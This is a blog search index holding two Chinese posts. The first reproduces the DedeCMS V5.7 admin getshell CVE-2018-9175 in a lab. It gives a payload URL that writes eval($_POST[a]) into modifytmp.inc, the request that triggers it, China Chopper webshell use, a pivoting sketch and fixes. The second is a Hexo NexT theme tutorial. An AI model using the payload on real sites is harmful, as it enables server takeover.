<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Dedecms V5.7后台的两处getshell(CVE-2018-9175)</title>
    <url>/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>基于工程实践4要求，又做了个对DedecmsV5.7后台两处getshell（CVE-2018-9175）的复现~~</p>
<p>要求是做关于内网渗透，技术有限只能在末尾概述一下这个过程，文章主要讲getshell哈 ，嘻嘻嘻</p>
<p><img src="https://github.com/xinkjung/Photos/raw/???/???.JPG" alt="wow"></p>
<span id="more"></span>

<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>不多说了，直接官网下载<a href="url???pan.">Dedecms V5.7</a>放在WWW目录下，安装即可！</p>
<p>顺带提供两个菜刀的下载目录叭 <a href="url">中国菜刀</a> 、 <a href="url">菜刀</a></p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>关键的来啦！来啦！注意哦！<br>（其实本人感觉这仿佛是个假洞 真的很迷。。。。。。。）</p>
<blockquote>
<p>查看源码，找到漏洞</p>
</blockquote>
<p>在/dede/sys_verifies.php 第148-第203行，代码如下：</p>
<p><img src="???url" alt="sys_1.php"></p>
<p><img src="???url" alt="sys_2.php"></p>
<p>以上代码中，得知会在/data目录下生成一个名为modifytmp.inc文件，且这个文件的内容是我们可以控制的，因此只需要再找一个include了这个inc文件的地方，变可完成攻击。</p>
<p>全局搜索了一下这个文件，发现就在同一个php文件下面：</p>
<p><img src="??url" alt="sys_3.php"></p>
<blockquote>
<p>写入SHELL并触发</p>
</blockquote>
<p>凑齐利用条件后，便可开始构造写入的语句啦！！！！最后的payload大概如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.18.77.200:8080/DedeCMS/uploads/dede/sys_verifies.php?action=getfiles&amp;refiles[0]=123&amp;refiles[1]=\%22;eval($_POST[a]);die();//</span><br></pre></td></tr></table></figure>

<p>阅读代码可知，会先从url中获取一个refiles参数，并且将refiles作为数组参数，被写入modifytmp.inc文件，然后紧接着foreach语句其实重点就是一个replace，绕过它就好了。</p>
<p><img src="url" alt="1_payload"></p>
<p>利用Firefox的插件HackBar执行语句，写入shell成功后，可以查看对应路径下的modifytmp.inc文件验证：</p>
<p><img src="url" alt="2_inc"></p>
<p>这个时候我们再执行触发shell的代码就可以成功getshell啦！！！</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.18.77.200:8080/DedeCMS/uploads/dede/sys_verifies.php?action=down</span><br><span class="line">POST data:  a=phpinfo();</span><br></pre></td></tr></table></figure>

<p><img src="url" alt="3_shell"></p>
<blockquote>
<p>中国菜刀添加SHELL</p>
</blockquote>
<p>很简单吧！嘻嘻嘻！ <img src="??????url" alt="bq1">打开菜刀添加SHELL，就可以获取相关的文件信息辽~</p>
<p><img src="url" alt="4_caidao.1"></p>
<p><img src="url" alt="4_caidao.2"></p>
<p>综上漏洞复现getshell就完成了哈哈哈哈哈哈哈</p>
<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p>就想放一个表情包略略略<img src="url" alt="bq2"></p>
<p>大概需要俩虚拟机(一个作内网服务器，一个作内网主机)和一个物理机(也就是我们所控制的攻击机)</p>
<p>首先物理机访问内网服务器，再通过漏洞getshell，拿到内网服务器控制权？</p>
<p>扫描发现内网服务器下有一台内网主机在运行，经过端口转发和代理又访问到了内网主机，再挖漏洞getshell。</p>
<p>这时，物理机也就是攻击机就可以控制内网主机啦~~~ 大概就是这么渗透的叭 哈哈哈哈</p>
<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>1.源码添加代码过滤恶意标签。</p>
<p>2.修改./dede(后台目录)为其他名称，避免使用admin、administrator等敏感名称。</p>
<p>3.及时打补丁，更新补丁。</p>
<h1 id="amazing"><a href="#amazing" class="headerlink" title="amazing"></a>amazing</h1><p>好啦！ 搞定了哦</p>
<p><img src="url" alt="bq3"></p>
<p><a href="balabalabbbbbba....">参考链接</a></p>
]]></content>
      <categories>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>getshell</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo博客搭建之NexT主题美化</title>
    <url>/2021/08/04/Hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B9%8BNexT%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96/</url>
    <content><![CDATA[<h2 id="安装-NexT"><a href="#安装-NexT" class="headerlink" title="安装 NexT"></a>安装 NexT</h2><p>Hexo 安装主题的方式非常简单，只需要将主题文件拷贝至站点目录的 <code>themes</code> 目录下， 然后修改下配置文件即可，安装步骤如下：</p>
<ol>
<li>下载</li>
</ol>
<p>在终端窗口下，定位到 <code>Hexo</code> 站点目录下。使用 <code>git</code> 代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/theme-next/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>启用</li>
</ol>
<p>与所有 Hexo 主题启用的模式一样。 当 <span class="label default">克隆/下载</span> 完成后，打开 <span class="label warning">站点配置文件</span> ， 找到 <code>theme</code> 字段，并将其值更改为 <code>next</code>:</p>
<figure class="highlight yml"><figcaption><span>_config.yml   启用 NexT 主题</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">theme:</span> <span class="string">next</span></span><br></pre></td></tr></table></figure>

<p>到此，NexT 主题安装完成，下一步将验证主题是否正确启用。在切换主题之后、验证之前，最好使用 <code> hexo clean</code> 来清除 Hexo 的缓存。</p>
<ol start="3">
<li>验证</li>
</ol>
<p>首先启动 Hexo 本地站点，并开启调试模式（ <code>hexo s --debug</code> ），在服务启动的过程，注意观察命令行输出是否有任何异常信息，当命令行输出中提示出：</p>
<p><code>INFO  Hexo is running at http://0.0.0.0:4000/. Press Ctrl+C to stop.</code></p>
<p>此时即可使用浏览器访问 <code>http://localhost:4000</code>，检查站点是否正确运行。</p>
<p>当站点的外观与下图所示类似时即说明已成功安装 NexT 主题。这是 NexT 默认的 Scheme —— Muse .</p>
<p><img src="/images/next.jpg" alt="NexT 主题界面"></p>
<h2 id="主题设定"><a href="#主题设定" class="headerlink" title="主题设定"></a>主题设定</h2><p>对于默认主题用起来有点不顺手，可以进行一些简单的设定改变主题的模样。</p>
<h3 id="选择-Scheme"><a href="#选择-Scheme" class="headerlink" title="选择 Scheme"></a>选择 Scheme</h3><p>Scheme 是 NexT 提供的一种特性，借助于 Scheme，NexT 为你提供多种不同的外观。同时，几乎所有的配置都可以 在 Scheme 之间共用。目前 NexT 支持三种 Scheme，他们是：</p>
<ul>
<li>Muse - 默认 Scheme，这是 NexT 最初的版本，黑白主调，大量留白</li>
<li>Mist - Muse 的紧凑版本，整洁有序的单栏外观</li>
<li>Pisces - 双栏 Scheme，小家碧玉似的清新</li>
<li>Gemini - Pisces 的改进版本，分块明确</li>
</ul>
<p>Scheme 的切换通过更改 <span class="label success">主题配置文件</span> ，搜索 <code>scheme</code> 关键字，将需用启用的 scheme 前面注释 <code>#</code> 去除即可。</p>
<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">scheme:</span> <span class="string">Muse</span></span><br><span class="line"><span class="comment">#scheme: Mist</span></span><br><span class="line"><span class="comment">#scheme: Pisces</span></span><br><span class="line"><span class="comment">#scheme: Gemini</span></span><br></pre></td></tr></table></figure>

<h3 id="设置语言"><a href="#设置语言" class="headerlink" title="设置语言"></a>设置语言</h3><p>编辑 <span class="label warning">站点配置文件</span> ， 将 <code>language</code> 设置成所需要的语言，例如选用简体中文，配置如下：</p>
<figure class="highlight yml"><figcaption><span>_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">language:</span> <span class="string">zh-Hans</span></span><br></pre></td></tr></table></figure>

<h3 id="设置菜单"><a href="#设置菜单" class="headerlink" title="设置菜单"></a>设置菜单</h3><p>菜单配置包括三个部分，第一是菜单项（名称和链接），第二是菜单项的显示文本，第三是菜单项对应的图标，NexT 使用的是 FontAwesome 提供的图标。</p>
<p>默认的 Next 主题样式中只包含首页和归档这两个链接，可以通过修改 <span class="label success">主题配置文件</span> 中的 <code>menu</code> 字段来新增更多页面菜单。 其设置格式是 <code>item name: link || icon</code> ：<br>    - item name ：是一个名称，这个名称并不直接显示在页面上，用于匹配图标以及翻译<br>    - link ：菜单链接<br>    - icon ：表示所用的 <code>FontAwesome</code> 图标名称</p>
<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="attr">about:</span> <span class="string">/about/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-user</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">/tags/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-tags</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="string">/categories/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-th</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">/archives/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-archive</span></span><br><span class="line">  <span class="comment">#schedule: /schedule/ || fa fa-calendar</span></span><br><span class="line">  <span class="comment">#sitemap: /sitemap.xml || fa fa-sitemap</span></span><br><span class="line">  <span class="attr">commonweal:</span> <span class="string">/404/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-heartbeat</span></span><br><span class="line"></span><br><span class="line"><span class="attr">menu_settings:</span></span><br><span class="line">  <span class="attr">icons:</span> <span class="literal">true</span>  <span class="comment"># 是否显示各个页面的图标</span></span><br><span class="line">  <span class="attr">badges:</span> <span class="literal">false</span>  <span class="comment"># 是否显示分类/标签/归档页的内容量</span></span><br></pre></td></tr></table></figure>

<p>以上设置的菜单的名称并不直接用于界面上的展示，而是查找其对应的语言翻译，并提取显示文本。这些翻译文本放置在 NexT 主题目录下的 <code>languages/&#123;language&#125;.yml</code> 中（ <code>&#123;language&#125;</code> 为你所使用的语言）。</p>
<p>以简体中文为例，若你需要添加一个菜单项，比如 <code>something</code> 。那么就需要修改简体中文对应的翻译文件 <code>languages/zh-Hans.yml</code> ，在 <code>menu</code> 字段下添加一项：</p>
<figure class="highlight yml"><figcaption><span>themes/next/languages/zh-Hans.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">首页</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">归档</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="string">分类</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">标签</span></span><br><span class="line">  <span class="attr">about:</span> <span class="string">关于</span></span><br><span class="line">  <span class="attr">search:</span> <span class="string">搜索</span></span><br><span class="line">  <span class="attr">commonweal:</span> <span class="string">公益404</span></span><br><span class="line">  <span class="attr">something:</span> <span class="string">有料</span></span><br><span class="line">  </span><br><span class="line"><span class="attr">menu_settings:</span></span><br><span class="line">  <span class="attr">icons:</span> <span class="literal">true</span>  <span class="comment"># 是否显示各个页面的图标</span></span><br><span class="line">  <span class="attr">badges:</span> <span class="literal">false</span>  <span class="comment"># 是否显示分类/标签/归档页的内容量</span></span><br></pre></td></tr></table></figure>

<h3 id="设置侧栏"><a href="#设置侧栏" class="headerlink" title="设置侧栏"></a>设置侧栏</h3><p>默认情况下，侧栏仅在文章页面（拥有目录列表）时才显示，并放置于右侧位置。 可以通过修改 <span class="label success">主题配置文件</span> 中的 <code>sidebar</code> 字段来控制侧栏的行为。侧栏的设置包括两个部分，其一是侧栏的位置， 其二是侧栏显示的时机。</p>
<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">sidebar:</span></span><br><span class="line">  <span class="comment"># position: left  # 靠左放置</span></span><br><span class="line">  <span class="attr">position:</span> <span class="string">right</span>   <span class="comment"># 靠右放置</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">display:</span> <span class="string">post</span></span><br></pre></td></tr></table></figure>

<p>修改 <code>sidebar.display</code> 的值(只针对 Muse | Mist 主题)，支持的选项有：</p>
<ul>
<li>post - 默认行为，在文章页面（拥有目录列表）时显示</li>
<li>always - 在所有页面中都显示</li>
<li>hide - 在所有页面中都隐藏（可以手动展开）</li>
<li>remove - 完全移除</li>
</ul>
<h3 id="头像"><a href="#头像" class="headerlink" title="头像"></a>头像</h3><p>编辑 <span class="label success">主题配置文件</span>， 修改字段 <code>avatar</code>， 值设置成头像的链接地址。其中，头像的链接地址可以是 <span class="label default">一个完整的互联网url</span> 或 <span class="label default">站点内的地址</span> 。</p>
<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment"># Sidebar Avatar</span></span><br><span class="line"><span class="attr">avatar:</span></span><br><span class="line">  <span class="attr">url:</span> <span class="string">/images/xin.jpg</span>   <span class="comment"># 头像图片放置在themes/next/source/images目录下</span></span><br><span class="line">  <span class="attr">rounded:</span> <span class="literal">false</span> <span class="comment"># 鼠标放在头像上时是否旋转</span></span><br><span class="line">  <span class="attr">rotated:</span> <span class="literal">false</span>  <span class="comment"># 头像是否设为圆形，否则为矩形</span></span><br></pre></td></tr></table></figure>

<h3 id="设置作者昵称及站点描述"><a href="#设置作者昵称及站点描述" class="headerlink" title="设置作者昵称及站点描述"></a>设置作者昵称及站点描述</h3><p>编辑 <span class="label warning">站点配置文件</span> ， 设置 <code>author</code> 为作者昵称，设置 <code>description</code> 字段为站点描述,可以是喜欢的一句签名:)</p>
<figure class="highlight yml"><figcaption><span>_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment"># Site</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">xinkjung&#x27;s</span> <span class="string">Blog</span></span><br><span class="line"><span class="attr">subtitle:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">&#x27; Be happy. &#x27;</span></span><br><span class="line"><span class="attr">keywords:</span></span><br><span class="line"><span class="attr">author:</span> <span class="string">xxx</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">zh-CN</span></span><br><span class="line"><span class="attr">timezone:</span> <span class="string">Asia/Shanghai</span></span><br></pre></td></tr></table></figure>


<h2 id="主题配置"><a href="#主题配置" class="headerlink" title="主题配置"></a>主题配置</h2><p>安装好的默认主题是很简洁的，很多信息和配置都需要手动来进行修改。</p>
<h3 id="添加标签-分类页面"><a href="#添加标签-分类页面" class="headerlink" title="添加标签/分类页面"></a>添加标签/分类页面</h3><span class="label default">标签</span> 页面将展示站点的所有标签，若你的所有文章都未包含标签，此页面将是空的。

<span class="label default">分类</span> 页面将展示站点的所有分类，若你的所有文章都未包含分类，此页面将是空的。 

<p>在终端窗口下，定位到 Hexo 站点目录下，新建一个页面，命名为 <code>tags</code> / <code>categories</code> ： </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new page tags</span><br><span class="line">hexo new page categories </span><br></pre></td></tr></table></figure>

<p>这时会发现 <code>source</code> 目录下出现了 <code>tags</code> 、 <code>categories</code> 两个文件夹，编辑文件夹内的 <code> index.md</code> 文件：</p>
<figure class="highlight yml"><figcaption><span>source/tags/index.md</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">标签</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;tags&quot;</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure>

<figure class="highlight yml"><figcaption><span>source/categories/index.md</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">分类</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;categories&quot;</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure>

<div class="note info">
            <p><i class="fa fa-info-circle"></i> 这里要注意确保在主题配置文件的 menu 字段中添加了 tags 和 categories 页面</p>
          </div>

<h3 id="腾讯公益404"><a href="#腾讯公益404" class="headerlink" title="腾讯公益404"></a>腾讯公益404</h3><p>与上面类似，也是通过新增页面的方法来添加该页面，编辑页面内容为腾讯公益404页面即可。寻找丢失儿童，让大家一起关注此项公益事业！</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new page 404</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><figcaption><span>source/404/index.html</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8;&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge,chrome=1&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;robots&quot;</span> <span class="attr">content</span>=<span class="string">&quot;all&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;robots&quot;</span> <span class="attr">content</span>=<span class="string">&quot;index,follow&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://qzone.qq.com/gy/404/style/404style.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/plain&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://www.qq.com/404/search_children.js&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> <span class="attr">homePageUrl</span>=<span class="string">&quot;/&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">homePageName</span>=<span class="string">&quot;回到我的主页&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://qzone.qq.com/gy/404/data.js&quot;</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://qzone.qq.com/gy/404/page.js&quot;</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<div class="note info">
            <p><i class="fa fa-info-circle"></i> 主题配置文件的 menu 字段中已经包含了 commonweal：/404/ ，直接在 menu 字段添加就可以了</p>
          </div>

<h3 id="关于我"><a href="#关于我" class="headerlink" title="关于我"></a>关于我</h3><p>原理同上，首先新建一个 <code>about</code> 页面，然后编辑 <code>index.md</code> 即为页面显示内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new page about</span><br></pre></td></tr></table></figure>

<figure class="highlight yml"><figcaption><span>source/about/index.md</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">About</span> <span class="string">Me</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2021-07-30 18:45:37</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;about&quot;</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="string">Welcome</span> <span class="string">to</span> <span class="string">xinkjung&#x27;s</span> <span class="string">blog!</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/menu.png" alt="菜单栏效果预览"></p>
<h3 id="代码高亮-复制"><a href="#代码高亮-复制" class="headerlink" title="代码高亮/复制"></a>代码高亮/复制</h3><p>NexT 主题的代码块默认使用白色的 <code>normal</code> 主题，可选的值有 <code>normal</code> 、 <code>night</code> 、  <code>night blue</code> 、 <code>night bright</code> 、 <code>night eighties</code> 、 <code>solarized</code> 、 <code>solarized</code> 、 <code>dark</code> 、 <code>galactic</code> ，可以在 <span class="label success">主题配置文件</span> 中进行设置：</p>
<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">codeblock:</span></span><br><span class="line">  <span class="attr">highlight_theme:</span> <span class="string">normal</span></span><br><span class="line">  <span class="attr">copy_button:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span>  <span class="comment"># 显示代码复制按钮</span></span><br><span class="line">    <span class="attr">show_result:</span> <span class="literal">true</span>  <span class="comment"># 展示复制结果</span></span><br></pre></td></tr></table></figure>

<h3 id="侧边栏社交"><a href="#侧边栏社交" class="headerlink" title="侧边栏社交"></a>侧边栏社交</h3><p>通过 <span class="label success">主题配置文件</span> 中的 <code>social</code> 字段进行设置，其键值格式是 <code>显示文本: 链接地址 || 图标名称</code> ：</p>
<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">social:</span></span><br><span class="line">  <span class="attr">GitHub:</span> <span class="string">https://github.com/xinkjung</span> <span class="string">||</span> <span class="string">fab</span> <span class="string">fa-github</span></span><br><span class="line">  <span class="attr">E-Mail:</span> <span class="string">mailto:xinkjung@163.com</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-envelope</span></span><br><span class="line">  <span class="comment">#Weibo: https://weibo.com/yourname || fab fa-weibo</span></span><br><span class="line">  <span class="comment">#Google: https://plus.google.com/yourname || fab fa-google</span></span><br><span class="line">  <span class="comment">#Twitter: https://twitter.com/yourname || fab fa-twitter</span></span><br><span class="line">  <span class="comment">#YouTube: https://youtube.com/yourname || fab fa-youtube</span></span><br><span class="line">  <span class="attr">Instagram:</span> <span class="string">https://instagram.com/xinkjung</span> <span class="string">||</span> <span class="string">fab</span> <span class="string">fa-instagram</span></span><br><span class="line">  <span class="comment">#Skype: skype:yourname?call|chat || fab fa-skype</span></span><br><span class="line"></span><br><span class="line"><span class="attr">social_icons:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>    <span class="comment"># 是否显示社交图标</span></span><br><span class="line">  <span class="attr">icons_only:</span> <span class="literal">false</span>    <span class="comment"># 是否只显示社交图标</span></span><br><span class="line">  <span class="attr">transition:</span> <span class="literal">false</span>    </span><br></pre></td></tr></table></figure>

<p><img src="/images/sidebar.png" alt="侧栏效果预览"></p>
<h3 id="开启打赏功能"><a href="#开启打赏功能" class="headerlink" title="开启打赏功能"></a>开启打赏功能</h3><p>越来越多的平台（微信公众平台，新浪微博，简书，百度打赏等）支持打赏功能，付费阅读时代越来越近，特此增加了打赏功能，支持微信打赏和支付宝打赏。 只需要 <span class="label success">主题配置文件</span> 中填入 <code>微信</code> 和 <code>支付宝</code> 收款二维码图片地址即可开启该功能:</p>
<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">reward_settings:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>  <span class="comment">#false</span></span><br><span class="line">  <span class="attr">animation:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">comment:</span> <span class="string">请我喝杯奶茶吧～</span></span><br><span class="line"></span><br><span class="line"><span class="attr">reward:</span></span><br><span class="line">  <span class="attr">wechatpay:</span> <span class="string">/images/wechatpay.png</span></span><br><span class="line">  <span class="attr">alipay:</span> <span class="string">/images/alipay.png</span></span><br><span class="line">  <span class="comment">#paypal: /images/paypal.png</span></span><br><span class="line">  <span class="comment">#bitcoin: /images/bitcoin.png</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/reward.png" alt="打赏效果预览"></p>
<h3 id="站点建立时间"><a href="#站点建立时间" class="headerlink" title="站点建立时间"></a>站点建立时间</h3><p>这个时间将在站点的底部显示，例如 © 2013 - 2015。 编辑 <span class="label success">主题配置文件</span>，修改字段 <code>since</code> 内容，同时文章底部的布局也都可以在 <code>footer</code> 字段下进行设置：</p>
<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">footer:</span></span><br><span class="line">  <span class="attr">since:</span> <span class="number">2018</span></span><br><span class="line">  <span class="attr">icon:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">fa</span> <span class="string">fa-heart</span></span><br><span class="line">    <span class="attr">animated:</span> <span class="literal">false</span>   <span class="comment"># 图标是否闪烁</span></span><br><span class="line">    <span class="attr">color:</span> <span class="string">&quot;#D3D3D3&quot;</span>   <span class="comment"># 图标颜色，这里是亮灰色</span></span><br><span class="line">  <span class="attr">copyright:</span>    <span class="comment"># 如果不设置，将会默认显示站点作者名称</span></span><br><span class="line">  <span class="attr">powered:</span> <span class="literal">false</span>  <span class="comment"># true  # 是否显示 Powered by Hexo &amp; NexT</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/footer.png" alt="底部效果预览"></p>
<h2 id="进阶设置"><a href="#进阶设置" class="headerlink" title="进阶设置"></a>进阶设置</h2><p>进行了一些基础配置之后感觉还不是很完美，于是又有了下面这些进阶设置。</p>
<h3 id="自定义网站图标"><a href="#自定义网站图标" class="headerlink" title="自定义网站图标"></a>自定义网站图标</h3><p>博客的默认图标是 <code>N</code> ，不过 NexT 支持修改图标，博客网站的图标可以在 <a href="https://www.iconfont.cn/">iconfont</a> 网站选择，然后选择或者创建相应大小的图标文件，放置在 <code>themes/next/sources/images</code> 目录下，并在 <span class="label success">主题配置文件</span> 中进行如下配置（只需要设置 <code>small</code> 和 <code>medium</code> 两个就可以）：</p>
<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">favicon:</span></span><br><span class="line">  <span class="attr">small:</span> <span class="string">/images/16x16.png</span></span><br><span class="line">  <span class="attr">medium:</span> <span class="string">/images/32x32.png</span></span><br><span class="line">  <span class="attr">apple_touch_icon:</span> <span class="string">/images/128x128.png</span></span><br><span class="line">  <span class="attr">safari_pinned_tab:</span> <span class="string">/images/star.svg</span></span><br><span class="line">  <span class="comment">#android_manifest: /images/manifest.json</span></span><br><span class="line">  <span class="comment">#ms_browserconfig: /images/browserconfig.xml</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/icon.png" alt="图标效果预览"></p>
<h3 id="添加数据统计"><a href="#添加数据统计" class="headerlink" title="添加数据统计"></a>添加数据统计</h3><p>不蒜子统计的引入很好的方便了设置阅读次数和访客数，可以在 <span class="label success">主题配置文件</span> 中进行如下设置：</p>
<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">busuanzi_count:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>     <span class="comment"># false，是否开启不蒜子统计功能</span></span><br><span class="line">  <span class="attr">total_visitors:</span> <span class="literal">false</span>     <span class="comment"># true，是否开启总访客数统计   </span></span><br><span class="line">  <span class="attr">total_visitors_icon:</span> <span class="string">fa</span> <span class="string">fa-user</span></span><br><span class="line">  <span class="attr">total_views:</span> <span class="literal">false</span>      <span class="comment"># true，是否开启总访问量统计</span></span><br><span class="line">  <span class="attr">total_views_icon:</span> <span class="string">fa</span> <span class="string">fa-eye</span></span><br><span class="line">  <span class="attr">post_views:</span> <span class="literal">true</span>      <span class="comment"># 是否开启文章阅读量统计</span></span><br><span class="line">  <span class="attr">post_views_icon:</span> <span class="string">fa</span> <span class="string">fa-eye</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/postview.png" alt="文章阅读量效果预览"></p>
<h3 id="修改标签样式"><a href="#修改标签样式" class="headerlink" title="修改标签样式"></a>修改标签样式</h3><p>对于博客文章底部的标签样式默认为 <code>#tag</code> ，我们可以将其改成标签图标样式，打开模板 <code>themes/next/layout/_macro/post.swig</code> ，搜索 <code>rel=&quot;tag&quot;&gt;#</code> ，将 <code>#</code> 换成 <code>&lt;i class=&quot;fa fa-tag&quot;&gt;&lt;/i&gt;</code> 就可以了：</p>
